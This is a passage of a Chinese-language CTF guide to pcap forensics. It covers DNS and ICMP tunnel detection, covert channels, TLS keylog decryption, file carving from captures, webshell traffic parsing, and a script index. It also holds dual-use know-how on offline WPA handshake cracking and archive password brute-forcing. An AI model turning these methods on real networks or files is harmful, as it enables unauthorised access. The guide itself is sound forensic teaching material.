+[12+]  CSRC(CC个) / 扩展头 / payload      ← 音频数据或 DTMF 事件
+</code></pre></div></div>
+
+<h3 id="37-dtmf-101">3.7 音频里的 DTMF（没有 101 包才需要）</h3>
+<p>还原出的 WAV 若是按键音：用 <a href="https://www.dialabc.com/sound/detect/">DTMF 在线识别</a>，或自己实现 Goertzel 检测。</p>
+<p>频率表：低频组 <code>697/770/852/941</code> × 高频组 <code>1209/1336/1477</code>，组合对应 12 个按键。</p>
+<blockquote>
+<p><strong>payload → WAV 不能直接改名</strong>：G.711 payload 是<strong>裸采样</strong>，要么按 μ-law/a-law 解码成 PCM 再包 WAV 头，要么 <code>ffmpeg -f mulaw -ar 8000 -i out.raw out.wav</code>。改后缀是放不出声的。</p>
+</blockquote>
+<hr />
+<h2 id="_2">四、隧道 / 隐蔽信道类</h2>
+<blockquote>
+<p>特征：<strong>正常业务不该传数据的地方却在传数据</strong>，或<strong>协议字段明显异常</strong>。</p>
+</blockquote>
+<h3 id="41-dns">4.1 DNS 隧道</h3>
+<p><strong>识别</strong>：</p>
+<ul>
+<li>某个域名下大量<strong>超长随机子域名</strong>（如 <code>aGVsbG8.badguy.com</code>）</li>
+<li>大量 <strong>TXT</strong> 记录查询（TXT 能塞几百字节）</li>
+<li>同一域名被高频查询</li>
+</ul>
+<p><strong>过滤器</strong>：<code>dns</code>、<code>dns.qry.name</code></p>
+<p><strong>处理</strong>：</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 抽所有查询名</span>
+tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcap<span class="w"> </span>-Y<span class="w"> </span><span class="s2">"dns.flags.response==0"</span><span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>dns.qry.name
+</code></pre></div></div>
+
+<p>按<strong>时间顺序</strong>取子域名的最前面那截 → base32/hex 解码 → 拼接 → 拿数据。</p>
+<p><strong>变体</strong>：子域名逐字符拼 flag（每个包一个字符，如 <code>a.flag.com</code>、<code>b.flag.com</code>…）→ 直接按顺序取首字母。</p>
+<h3 id="42-icmp">4.2 ICMP 隧道</h3>
+<p><strong>识别</strong>：</p>
+<ul>
+<li>ICMP 包数量异常多，且 <code>data</code> 段有内容（正常 ping 的 data 是固定填充）</li>
+<li>请求和响应 data 长度一致且都很大</li>
+</ul>
+<p><strong>过滤器</strong>：<code>icmp</code>、<code>icmp.type==8</code>（请求）</p>
+<p><strong>处理</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcap<span class="w"> </span>-Y<span class="w"> </span><span class="s2">"icmp.type==8"</span><span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>data.data
+</code></pre></div></div>
+
+<p>把所有 payload 按序拼起来 → hex 解码 → 常得到文件。ICMP 的 <code>data</code> 段一次能带 32~1400 字节，比 DNS 快。</p>
+<h3 id="43">4.3 其他隐蔽信道</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>藏在哪</th>
+<th>怎么发现</th>
+<th>怎么取</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>IP ID 字段</strong></td>
+<td><code>ip.id</code> 递增/有规律</td>
+<td>抽 <code>ip.id</code> 当字节流</td>
+</tr>
+<tr>
+<td><strong>TCP 窗口 / 序列号</strong></td>
+<td><code>tcp.window_size</code> 值杂乱</td>
+<td>抽该字段</td>
+</tr>
+<tr>
+<td><strong>TTL</strong></td>
+<td><code>ip.ttl</code> 只有几个取值</td>
+<td>抽 <code>ip.ttl</code> 映射成 bit</td>
+</tr>
+<tr>
+<td><strong>包长度</strong></td>
+<td>长度就是 ASCII（如 102=<code>f</code>）</td>
+<td>抽 <code>frame.len</code> 序列</td>
+</tr>
+<tr>
+<td><strong>TCP 标志位</strong></td>
+<td>flags 组合有规律</td>
+<td>抽 <code>tcp.flags</code></td>
+</tr>
+<tr>
+<td><strong>时间间隔</strong></td>
+<td>包间隔长短 = 0/1</td>
+<td>算 delta 时间映射成 bit</td>
+</tr>
+<tr>
+<td><strong>分片</strong></td>
+<td><code>ip.frag_offset</code> 有异常</td>
+<td>手动重组</td>
+</tr>
+<tr>
+<td><strong>HTTP 特定头</strong></td>
+<td>头的顺序/大小写异常</td>
+<td>按序取</td>
+</tr>
+</tbody>
+</table></div>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 通用抽字段模板</span>
+tshark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcap<span class="w"> </span>-Y<span class="w"> </span><span class="s2">"条件"</span><span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>字段名
+</code></pre></div></div>
+
+<hr />
+<h2 id="_3">五、加密流量</h2>
+<h3 id="51-tls-https">5.1 TLS / HTTPS 解密</h3>
+<p><strong>没有密钥就解不了</strong>，这是硬限制。有三条路：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>前提</th>
+<th>做法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SSLKEYLOGFILE</strong></td>
+<td>有浏览器导出过会话密钥</td>
+<td>环境变量 <code>SSLKEYLOGFILE=keys.log</code>，让浏览器跑一遍；Wireshark <code>Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename</code> 指向该文件</td>
+</tr>
+<tr>
+<td><strong>RSA 私钥</strong></td>
+<td>服务器私钥 + <strong>非</strong> ECDHE 套件</td>
+<td>Preferences → TLS → RSA keys list 添加 <code>IP,端口,http,私钥文件</code></td>
+</tr>
+<tr>
+<td><strong>题给 keylog</strong></td>
+<td>题目直接提供</td>
+<td>同第一行配置</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>现代网站几乎全用 ECDHE 前向保密 → <strong>私钥法失效</strong>，只能靠 keylog。</p>
+</blockquote>
+<p><strong>解不开时的思路</strong>：题目的答案往往不在 TLS 层里。去看<strong>同时间段的明文流量</strong>（HTTP 上是不是先下发了什么东西）、看<strong>证书里的域名</strong>（<code>tls.handshake.extensions_server_name</code>）、看<strong>流量大小与时间模式</strong>。</p>
+<h3 id="52-wpa-wpa2">5.2 WPA / WPA2 无线握手</h3>
+<p><strong>识别</strong>：协议分级出现 <code>802.11</code>；过滤 <code>eapol</code> 能看到 4 次握手包。</p>
+<p><strong>处理</strong>：</p>
+<ol>
+<li>抽 SSID：<code>wlan.ssid</code> / 过滤 <code>wlan.fc.type_subtype==8</code>（Beacon）</li>
+<li>确认抓齐 EAPOL 4 次握手（至少 1、2、4）</li>
+<li>导出成 hashcat/aircrack 格式，<strong>离线爆破</strong>（字典或 PIN）</li>
+</ol>
+<p><strong>变体</strong>：只考"找 SSID"或"找隐藏的 SSID"（Beacon 里 SSID 长度为 0，但要靠 probe response 或关联请求找）。</p>
+<hr />
+<h2 id="_4">六、文件提取（怎么把包里的文件挖出来）</h2>
+<blockquote>
+<p><strong>一句话总纲</strong>：不管什么协议，文件字节最终都是<strong>连续躺在 TCP/UDP payload 里</strong>的。所以只有两条路 ——<br />
+<strong>① 让 Wireshark 帮你按协议重组</strong>（Export Objects，最快）；<br />
+<strong>② 不认识协议就按魔数硬扫</strong>（整个 pcap 当字节流搜文件头，等价 foremost）。</p>
+</blockquote>
+<h3 id="61">6.1 先判断：文件藏在哪种"载体"里</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>载体</th>
+<th>典型协议</th>
+<th>特征</th>
+<th>提取入口</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>独立文件传输</strong></td>
+<td>FTP / TFTP / SMB</td>
+<td>除控制连接外还有一条<strong>独立数据连接</strong></td>
+<td>Export Objects → 对应协议</td>
+</tr>
+<tr>
+<td><strong>HTTP 下载/上传</strong></td>
+<td>HTTP</td>
+<td><code>Content-Type</code> 是 octet-stream 或附件</td>
+<td>Export Objects → HTTP</td>
+</tr>
+<tr>
+<td><strong>邮件附件</strong></td>
+<td>SMTP / POP3 / IMAP</td>
+<td>body 里有 MIME <code>Content-Disposition: attachment</code></td>
+<td>手工 Follow 或 Export Objects</td>
+</tr>
+<tr>
+<td><strong>协议里夹带</strong></td>
+<td>任意</td>
+<td>文件字节混在请求参数（webshell 的 z2）</td>
+<td><code>14-编码数据抠图</code> 脚本</td>
+</tr>
+<tr>
+<td><strong>自定义/加密隧道</strong></td>
+<td>私有协议</td>
+<td>看不出协议名，<code>_ws.col.Protocol</code> 显示 TCP/UDP/data</td>
+<td><code>11-文件分离</code> 硬扫</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="62-export-objects">6.2 方法一：Export Objects（首选，但要"认得出来"）</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>File → Export Objects → ⬇ 选一个
+    HTTP            网页/下载的文件
+    SMB             共享目录里的文件
+    TFTP / FTP-DATA TFTP、FTP 传输的文件
+    DICOM           医疗影像
+</code></pre></div></div>
+
+<p><strong>导出后第一件事</strong>：按 0.5 节验魔数，<strong>不要信扩展名</strong>。</p>
+<blockquote>
+<p><strong>什么时候是空的？</strong> 见下面这个真实的坑 👇</p>
+</blockquote>
+<h4 id="ftp-data">⚠️ 坑：FTP-DATA 导出对话框里什么都没有</h4>
+<p><strong>现象</strong>：明明在 <code>ftp</code> 过滤里看到 <code>RETR xxx.rar</code>，打开 Export Objects → FTP-DATA 却是空白列表。</p>
+<p><strong>原因</strong>：FTP 的数据连接是<strong>动态端口</strong>（由 <code>PORT</code>/<code>PASV</code> 命令临时协商），Wireshark 要靠「控制连接上捕获到的 PORT 命令」去<strong>动态注册</strong>这条数据连接。如果控制连接本身不规范（典型：<strong>两端端口都不是 21</strong>，如某题控制连接是 <code>7837 ↔ 21</code>），这套关联就建立不起来 → 数据流只被当作普通 <code>TCP</code>。</p>
+<p><strong>先确认是不是这个原因</strong>：</p>
+<div class="code-block" data-lang="sh"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>~/tools<span class="se">\W</span>ireshark<span class="se">\t</span>shark.exe<span class="w"> </span>-r<span class="w"> </span>文件.pcapng<span class="w"> </span>-Y<span class="w"> </span><span class="s2">"ftp-data"</span><span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>frame.number
+<span class="c1"># 输出 0 行 → 就是没识别出来，别再跟导出对话框较劲</span>
+</code></pre></div></div>
+
+<p><strong>三条替代路线</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 路线A：命令行走 Follow（跟 GUI 的 Follow Stream 等价）</span>
+tshark<span class="w"> </span>-r<span class="w"> </span>文件.pcapng<span class="w"> </span>-q<span class="w"> </span>-z<span class="w"> </span>follow,tcp,raw,6
+
+<span class="c1"># 路线B：直接抽 payload（推荐，最干净）</span>
+tshark<span class="w"> </span>-r<span class="w"> </span>文件.pcapng<span class="w"> </span>-Y<span class="w"> </span><span class="s2">"tcp.port==7842 &amp;&amp; ip.src==172.16.80.153 &amp;&amp; tcp.len&gt;0"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>tcp.payload<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">'\r\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-r<span class="w"> </span>-p<span class="w"> </span>&gt;<span class="w"> </span>out.rar
+<span class="c1">#                            ↑ tr 先删换行，否则 hex 串被劈开  ↑ xxd -r -p 把 hex 还原成字节</span>
+
+<span class="c1"># 路线C：按魔数硬扫（不认识协议也能用）</span>
+py<span class="w"> </span><span class="m">11</span>-文件分离.py<span class="w">      </span><span class="c1"># 改顶部 FILE 一行</span>
+</code></pre></div></div>
+
+<blockquote>
+<p><strong><code>tcp.len&gt;0</code> 一定要加</strong> —— 否则会把 ACK 空包（<code>Len=0</code>）也带上。<br />
+<strong>FTP 的 <code>PORT</code> 命令是三段式</strong>：<code>PORT a,b,c,d,p1,p2</code> → 端口 <code>= p1*256+p2</code>（如 <code>30,158</code> → <code>7838</code>），别当十进制读。</p>
+</blockquote>
+<h3 id="63-gui-follow-tcp-stream">6.3 方法二：GUI 里 Follow → TCP Stream（手把手）</h3>
+<p><strong>操作</strong>（以挖出压缩包为例）：</p>
+<ol>
+<li><strong>定位</strong>：显示过滤器输入 <code>tcp.port==7842</code>（或直接点到那个 <code>Len=196</code> 的数据帧）</li>
+<li><strong>右键那一帧 → <code>Follow ▸ TCP Stream</code></strong></li>
+<li><strong>切换视图</strong>：窗口右下角 <code>Show data as</code> 下拉框，从 <code>ASCII</code> 改成 <strong><code>Raw</code></strong></li>
+<li><strong>另存</strong>：点 <code>Save as...</code>，文件名写 <code>out.rar</code>（类型选 All Files，别让它自动加 <code>.txt</code>）</li>
+</ol>
+<p><strong>为什么第 3 步最关键</strong>：</p>
+<p>ASCII 视图会把<strong>所有非可打印字节显示成一个点 <code>.</code></strong>。以一个 196 字节的 RAR 为例：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th></th>
+<th>字节数</th>
+<th>占比</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>可打印</td>
+<td>65</td>
+<td>33%</td>
+</tr>
+<tr>
+<td><strong>不可打印</strong></td>
+<td><strong>131</strong></td>
+<td><strong>67%</strong></td>
+</tr>
+</tbody>
+</table></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>hex  : 526172211a0700ce997380000d00000000000000453fe1984de813ddf0543595
+ASCII: Rar!.....s..........E?..M....T5.
+        ↑↑↑↑  ↑          ↑↑↑↑      ↑↑↑↑
+      能还原  这里的 ce 99 73 80 00 0d 00 全被点号抹掉了
+</code></pre></div></div>
+
+<p><strong>在 ASCII 视图下保存 = 存一个被打码的残缺文件</strong>，解压必然报错。<strong>Raw 才是原始字节。</strong></p>
+<blockquote>
+<p>Follow 的视图选项：<code>ASCII</code>（看文本，非文本变点号）/ <code>EBCDIC</code>（大型机）/ <strong><code>Raw</code>（存二进制必须用这个）</strong> / <code>C Arrays</code> / <code>Hex Dump</code>。</p>
+</blockquote>
+<p><strong>注意方向</strong>：如果<strong>两个方向都有数据</strong>（如 HTTP 一来一回），Follow 会把它们<strong>按顺序混在一起</strong>，存下来是废的。此时在过滤器里限定方向：<br />
+<code>tcp.stream==6 &amp;&amp; ip.src==172.16.80.153</code>（只取服务器→客户端）。</p>
+<h3 id="64">6.4 方法三：按魔数硬扫（不依赖协议解析）</h3>
+<p>把<strong>整个 pcap 当字节流</strong>搜文件头，找到就按该格式的结束标志切片。<strong>等价于 <code>foremost</code> / <code>binwalk -e</code>，但纯 Python 不用装工具。</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>py<span class="w"> </span><span class="m">11</span>-文件分离.py<span class="w">      </span><span class="c1"># 改顶部 FILE 一行 → 输出 carve_out/</span>
+</code></pre></div></div>
+
+<p>原理与要点：</p>
+<ul>
+<li><strong>为什么能扫到</strong>：文件传输的 payload 在 pcap 里是<strong>按包顺序连续追加</strong>的，所以文件字节就是一段连续内存。</li>
+<li><strong>每个格式怎么定尾</strong>：</li>
+</ul>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>格式</th>
+<th>结尾标志</th>
+<th>是否精确</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JPEG</td>
+<td><code>FF D9</code></td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td><code>IEND</code> + 4 字节 CRC</td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td><code>3B</code></td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>BMP</td>
+<td>文件头 2~6 字节里写了总长</td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>PDF</td>
+<td><code>%%EOF</code></td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>ZIP</td>
+<td>文件尾的中央目录结束记录 <code>PK\x05\x06</code></td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td><strong>RAR / 7z / GZIP</strong></td>
+<td>算不出 → <strong>切到文件尾</strong></td>
+<td>⚠️ 带尾巴</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>RAR 为什么不要试图解析块结构</strong>：抓包里传的 RAR <strong>头部字段常常不完整</strong>。实测某题的 RAR 声明 header size = 5096，而文件实际只有 196 字节（抓包时还没写完/被截断），照块结构算必然错。而 <strong>7-Zip / WinRAR 都能容忍 RAR 尾部的多余字节</strong>，所以"切到文件尾"反而是正确的省事做法。</p>
+<p><strong>假阳性</strong>：2 字节签名（<code>BM</code>=BMP、<code>MZ</code>=PE）最容易误命中。筛选原则：<strong>优先看偏移最大、体积合理的那个</strong>；打不开的就是假的。</p>
+<h3 id="65-kali-foremost-binwalk">6.5 方法四：Kali 的 foremost / binwalk（题目原解常用）</h3>
+<div class="code-block" data-lang="sh"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>foremost<span class="w"> </span>-i<span class="w"> </span>文件.pcapng<span class="w">          </span><span class="c1"># 输出到 output/ 下按类型分目录</span>
+binwalk<span class="w"> </span>-e<span class="w"> </span>文件.pcapng<span class="w">           </span><span class="c1"># 加 -e 自动提取</span>
+</code></pre></div></div>
+
+<p><strong>优点</strong>：完全不依赖协议；<strong>缺点</strong>：不精确、假阳性多（长得像魔数的随机数据会被切出来）。<br />
+本机没装（<code>command -v foremost</code> 为空），所以上面 <code>15-</code> 脚本就是它的本地替代品。</p>
+<h3 id="66">6.6 各种"藏文件"手法对照表</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>藏着的手法</th>
+<th>怎么发现</th>
+<th>怎么挖</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>独立数据连接传文件</strong></td>
+<td>看 <code>PORT</code>/<code>PASV</code>，找非标准端口的会话</td>
+<td>Export Objects 或抽 <code>tcp.payload</code></td>
+</tr>
+<tr>
+<td><strong>协议里 hex/base64 编码</strong></td>
+<td>看到 <code>z2=FFD8...</code>、<code>/9j/4AAQ</code> 这种长串</td>
+<td><code>14-编码数据抠图</code></td>
+</tr>
+<tr>
+<td><strong>文件头伪装</strong>（<code>.php</code> 其实是图片）</td>
+<td>验魔数</td>
+<td>直接改名/解码</td>
+</tr>
+<tr>
+<td><strong>尾部追加</strong>（图片后面跟个 zip）</td>
+<td><code>strings</code> / 扫魔数</td>
+<td><code>11-文件分离</code></td>
+</tr>
+<tr>
+<td><strong>分片/重组</strong></td>
+<td>一个文件跨多条流、多个包</td>
+<td>Follow Stream 或按 stream 号分别抽</td>
+</tr>
+<tr>
+<td><strong>压缩后再编码</strong>（gzip → base64）</td>
+<td>解码后是 <code>1F 8B</code></td>
+<td>解两层</td>
+</tr>
+<tr>
+<td><strong>加密隧道里</strong>（冰蝎/哥斯拉/<code>back.exe</code>）</td>
+<td>等长 1460 字节的不可读流</td>
+<td>需要密钥，拿不到就放弃这层</td>
+</tr>
+<tr>
+<td><strong>整个 pcap 就是一个文件</strong></td>
+<td>魔数在偏移 0</td>
+<td>直接改扩展名</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="67">6.7 提取 ≠ 解密</h3>
+<p>务必分清两步：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>提取（把字节从包里弄出来）  →  解密/解压/解码（把字节变成可读内容）
+   Follow Stream / 抽 payload        7z 解压、base64 解码、AES 解密、爆密码
+</code></pre></div></div>
+
+<p><strong>挖出来的压缩包有密码是常态</strong>，这不算失败。接 <code>12-密码爆破.py</code> / <code>密码爆破.py</code>。</p>
+<hr />
+<h2 id="toolsctfmisc">七、脚本索引（<code>~/tools\CTF工具箱\misc\</code>）</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>什么时候用</th>
+<th>改哪里</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>16-流量包导出-HTTP与蚁剑webshell.py</code></td>
+<td>pcap 里有 HTTP 流量、尤其<strong>蚁剑式 webshell</strong></td>
+<td>顶部 <code>PCAP</code> 一行</td>
+</tr>
+<tr>
+<td><code>14-编码数据抠图-hex与base64还原.py</code></td>
+<td><strong>流量/网页/日志里有 hex 或 base64 编码的文件</strong>（图片、压缩包）</td>
+<td>顶部 <code>SRC</code> 一行</td>
+</tr>
+<tr>
+<td><code>08-USB鼠标流量还原轨迹.py</code></td>
+<td>USB 鼠标题</td>
+<td><code>PCAP</code> / <code>DEVICE</code> 两行</td>
+</tr>
+<tr>
+<td><code>10-USB键盘流量还原文本.py</code></td>
+<td>USB 键盘题（含回放编辑）</td>
+<td><code>PCAP</code> / <code>DEVICE</code> 两行</td>
+</tr>
+<tr>
+<td><code>11-文件分离.py</code></td>
+<td><strong>看得出包里有文件但不知道从哪挖</strong>；Export Objects 为空时；图片尾部追加</td>
+<td><code>FILE</code> 一行</td>
+</tr>
+<tr>
+<td><code>12-RAR密码爆破.py</code> / <code>密码爆破.py</code></td>
+<td>加密压缩包（纯数字/字典）</td>
+<td>数据行</td>
+</tr>
+<tr>
+<td><code>03-文件类型识别与strings.py</code></td>
+<td>导出文件后验真类型</td>
+<td><code>FILE</code> 一行</td>
+</tr>
+<tr>
+<td><code>06-像素取色与LSB提取.py</code></td>
+<td>图片 LSB 隐写</td>
+<td><code>FILE</code> 一行</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong><code>11-文件分离.py</code> 的切片策略</strong>（输入可以是图片、文档，<strong>也可以是 pcap</strong>）：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>格式</th>
+<th>结尾怎么定</th>
+<th>切出来</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JPEG</td>
+<td>找 <code>FF D9</code></td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>找 <code>IEND</code>+4CRC</td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td>找 <code>3B</code></td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>BMP</td>
+<td>读文件头里的总长</td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>PDF</td>
+<td>找 <code>%%EOF</code></td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td>ZIP</td>
+<td>找尾部中央目录 <code>PK\x05\x06</code></td>
+<td>✅ 精确</td>
+</tr>
+<tr>
+<td><strong>RAR / 7z / GZIP</strong></td>
+<td>算不出 → 切到文件尾</td>
+<td>⚠️ 带尾巴</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p><strong>为什么 ZIP 必须精确定尾</strong>：ZIP 的中央目录在<strong>文件尾</strong>，多塞垃圾会让 7z 直接报错打不开。<br />
+<strong>RAR 为什么不用精确定尾</strong>：抓包里的 RAR 头部长度字段常不完整（实测某题声明 header size=5096 而文件只有 196 字节），解析块结构必错；而 7z/WinRAR 能容忍尾部多余字节。</p>
+</blockquote>
+<p><strong><code>16-流量包导出</code> 干了什么</strong>：一条命令把 HTTP 流量全落地 ——</p>
+<ul>
+<li><code>requests.txt</code>：所有请求一览 + webshell 的路径/代码/还原结果</li>
+<li><code>webshell/</code>：拆出每条木马请求的 <code>z1</code>（路径）、<code>action</code>（PHP 代码）、<code>z2</code>（<strong>自动 hex 还原成真实文件</strong>）</li>
+<li><code>http_objects/</code>：每个响应体单独成文件（等价 Export Objects HTTP）</li>
+<li><code>streams/</code>：每条 TCP 流原始字节（等价 Follow → TCP Stream → Save as）</li>
+</ul>
+<p><strong>依赖</strong>：纯 Python + <strong>scapy</strong>，不调 tshark / Wireshark。<code>py -m pip install scapy</code>。</p>
+<hr />
+<h2 id="_5">八、常见坑（汇总）</h2>
+<ol>
+<li><strong>包 ≠ 流</strong>：一行一个包，一条流可能几十上百包。看到一堆小包先 Follow。</li>
+<li><strong>一个字符一包</strong>：代理流量常见（7890 等端口），Follow 拼回即可。</li>
+<li><strong>flag 不一定是明文</strong>：可能是多层编码（URL → base64 → 再 URL），解一层看不出来就再解。</li>
+<li><strong>导出文件必须验真类型</strong>：别信扩展名，用魔数。</li>
+<li><strong>USB 脚本"没输出"先查设备地址和字段名</strong>，别查路径 —— 设备写错一个字就一个包都抓不到。</li>
+<li><strong><code>usbhid.data</code> 与 <code>usb.capdata</code> 都要试</strong>，同一份包里可能一个空一个满。</li>
+<li><strong>键盘题漏"回放编辑"</strong>：末尾方向键+退格是在改错字，不回放 flag 里全是错字。</li>
+<li><strong>鼠标轨迹别连线穿过抬笔</strong>，并试 4 种翻转。</li>
+<li><strong>RTP 先过滤 <code>rtp.p_type==101</code></strong>，有就不用听音频。</li>
+<li><strong>RTP 注意烟雾弹流</strong>：包数少 + PT 非常规 + SSRC 扎堆 = 干扰。</li>
+<li><strong>加密流量先判断"能不能解"</strong>：ECSHE/ECDHE 套件拿私钥也没用，果断转别的层。</li>
+<li><strong>不要手工复制 z2 那种几十万字符的字段</strong>，用脚本。</li>
+<li><strong>Export Objects 是空的 ≠ 包里没文件</strong>：先 <code>tshark -Y "ftp-data"</code> 数帧数，0 帧说明协议没识别出来（动态端口的 FTP 最常见），改走 Follow Stream 或魔数硬扫。</li>
+<li><strong>Follow Stream 存文件必须切 <code>Raw</code></strong>，ASCII 视图会把所有不可打印字节变成点号，存下来是残缺文件。</li>
+<li><strong>Follow 到多方向流量要限定方向</strong>，否则两个方向的数据被混在一起。</li>
+<li><strong><code>tr -d '\r\n'</code> 不能省</strong>：tshark 每行输出一个包，行尾换行会把 hex 串劈开，不删就解出乱码。</li>
+<li><strong>RAR 的构造器不能信</strong>：抓包里的 RAR 头部长度字段常不完整，别解析块结构，直接切到文件尾（7z/WinRAR 能容错）。</li>
+</ol>
+<hr />
+<h2 id="_6">九、实战记录</h2>
+<h3 id="_7">通用技巧：编码数据抠图（认签名 → 解码 → 验魔数）</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>编码</th>
+<th>开头长这样</th>
+<th>怎么解</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>hex</td>
+<td><code>ffd8ffe0...</code> / <code>89504e47...</code>（全 0-9a-f 且长度为偶）</td>
+<td><code>bytes.fromhex(s)</code></td>
+</tr>
+<tr>
+<td>base64</td>
+<td><code>/9j/4AAQ...</code> / <code>iVBORw...</code> / <code>UEsDBA...</code></td>
+<td><code>base64.b64decode(s)</code></td>
+</tr>
+<tr>
+<td>data URI</td>
+<td><code>data:image/jpeg;base64,/9j/4AAQ...</code></td>
+<td>去掉前缀再 base64 解码</td>
+</tr>
+<tr>
+<td>URL 编码</td>
+<td><code>%FF%D8%FF%E0</code></td>
+<td><code>urllib.parse.unquote_to_bytes(s)</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>魔数 ↔ base64 前缀对照</strong>（记前缀比记字节快，一眼扫描就能认出来）：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>hex 开头</th>
+<th>base64 开头</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ffd8ff</code></td>
+<td><code>/9j/</code></td>
+<td>JPEG 图片</td>
+</tr>
+<tr>
+<td><code>89504e47</code></td>
+<td><code>iVBORw</code></td>
+<td>PNG 图片</td>
+</tr>
+<tr>
+<td><code>47494638</code></td>
+<td><code>R0lGOA</code></td>
+<td>GIF 动图</td>
+</tr>
+<tr>
+<td><code>424d</code></td>
+<td><code>Qk0</code></td>
+<td>BMP 图片</td>
+</tr>
+<tr>
+<td><code>504b0304</code></td>
+<td><code>UEsDBA</code></td>
+<td>ZIP 压缩包</td>
+</tr>
+<tr>
+<td><code>526172211a07</code></td>
+<td><code>UmFyIRoH</code></td>
+<td>RAR</td>
+</tr>
+<tr>
+<td><code>377abcaf271c</code></td>
+<td><code>N3q8rycc</code></td>
+<td>7z</td>
+</tr>
+<tr>
+<td><code>25504446</code></td>
+<td><code>JVBERg</code></td>
+<td>PDF</td>
+</tr>
+<tr>
+<td><code>7f454c46</code></td>
+<td><code>f0VMRg</code></td>
+<td>ELF 可执行</td>
+</tr>
+<tr>
+<td><code>4d5a</code></td>
+<td><code>TVo</code></td>
+<td>PE / EXE</td>
+</tr>
+<tr>
+<td><code>3c3f706870</code></td>
+<td><code>PD9waHA</code></td>
+<td>PHP 源码</td>
+</tr>
+<tr>
+<td><code>1f8b</code></td>
+<td><code>H4s</code></td>
+<td>GZIP</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p><strong>关键坑</strong>：base64 字符集是 hex 的<strong>超集</strong>（<code>A-Za-z0-9+/</code> 里含 <code>0-9a-f</code>），所以一段 hex 字符串<strong>常常也能被 base64 成功解出</strong>（不报错），只是解出来是乱码。<strong>判别标准只有一条：解码后开头是不是已知魔数</strong>，不能靠"字符集像什么"来猜。</p>
+</blockquote>
+<p><strong>现成脚本</strong>：<code>~/tools\CTF工具箱\misc\14-编码数据抠图-hex与base64还原.py</code></p>
+<ul>
+<li>输入可以是 pcap（自动扫所有 HTTP 请求参数 + 响应体），也可以是任意 txt/html/php 文本</li>
+<li>同时试 hex 与 base64，按"能否解出魔数"裁决；自动去重、自动按类型起扩展名</li>
